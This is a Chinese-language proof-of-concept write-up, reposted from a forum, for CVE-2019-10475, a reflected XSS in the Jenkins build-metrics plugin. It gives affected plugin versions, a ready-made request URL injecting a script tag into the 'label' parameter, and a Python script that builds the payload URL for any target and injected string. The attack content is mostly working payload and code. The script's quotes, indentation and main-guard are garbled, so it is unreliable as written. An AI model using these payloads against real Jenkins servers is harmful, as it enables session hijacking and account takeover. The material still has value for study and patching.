# （CVE-2019-10475）反射xss

> 原文：[https://www.zhihuifly.com/t/topic/2988](https://www.zhihuifly.com/t/topic/2988)

# （CVE-2019-10475） 插件反射型xss

## 一、漏洞简介

## 二、漏洞影响

360 FireLine插件， 最高包括1.7.2
Bitbucket OAuth插件， 最高包括0.9
Build-metrics插件 1.3及以下
部署WebLogic Plugin 最高至4.1
Dynatrace应用程序监视插件， 最高包括2.1.3
Dynatrace应用程序监视插件， 最高包括2.1.4
ElasticBox Jenkins Kubernetes CI / CD插件， 最高至1.3
包含1.1.4及以下版本的 全局Post Script插件
Libvirt Slaves插件， 最高包括1.8.5
截至 2.7.0的 Mattermost Notification插件
Sonar Gerrit插件， 最高包括2.3
Zulip插件 （包括1.1.0及以下）

## 三、复现过程

### 1、手工复现

该vulnearble插件位于http://localhost:8080/plugin/build-metrics/，漏洞参数为label。

```
http://192.168.1.75:8080/plugin/build-metrics/getBuildStats?label=<script>alert("CVE-2019-10475")</script>&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search 
```

![image](img/3b907c11df79bf260c28fcf542e7d936.png)

### 2、利用脚本

> ```
> Usage:
> 
> $ python3 CVE-2019-10475.py --help
> 
> usage: CVE-2019-10475.py [-h] [-p PORT] [-d DOMAIN] [-i INJECT]
> 
> CVE-2019-10475 `optional arguments:
> 
> -h, --help            show this help message and exit
> 
> -p PORT, --port PORT  port
> 
> -d DOMAIN, --domain DOMAIN
> 
> domain
> 
> -i INJECT, --inject INJECT
> 
> inject` 
> ```

```
#!/usr/bin/env python

import sys

import argparse

VULN_URL = ‘’’{base_url}/plugin/build-metrics/getBuildStats?label={inject}&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search’’’

def get_parser():

parser = argparse.ArgumentParser(description=‘CVE-2019-10475’)

parser.add_argument(’-p’, ‘–port’, help=‘port’, default=80, type=int)

parser.add_argument(’-d’, ‘–domain’, help=‘domain’, default=‘localhost’, type=str)

parser.add_argument(’-i’, ‘–inject’, help=‘inject’, default=’<script>alert(“CVE-2019-10475”)</script>’, type=str)

return parser

def main():

parser = get_parser()

args = vars(parser.parse_args())

port = args[‘port’]

domain = args[‘domain’]

inject = args[‘inject’]

if port == 80:

base_url = f’http://{domain}’

elif port == 443:

base_url = f’https://{domain}’

else:

base_url = f’http://{domain}:{port}’

build_url = VULN_URL.format(base_url=base_url, inject=inject)

print(build_url)

return 0 `if **name** == ‘**main**’:

sys.exit(main())` 
```